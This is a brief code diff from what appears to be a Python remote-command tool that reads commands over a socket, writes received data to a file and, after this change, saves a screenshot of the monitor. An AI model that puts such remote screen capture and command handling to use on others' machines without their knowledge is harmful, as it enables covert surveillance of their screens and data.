@@ -19,7 +19,7 @@ while command != "exit":
         f = open("note","wb")
         f.write(message)
         f.close()
-        #image.save("monitor-screen.png")
+        image.save("monitor-screen.png")
 
     elif command == "os":
         message= conf.recv(262144)
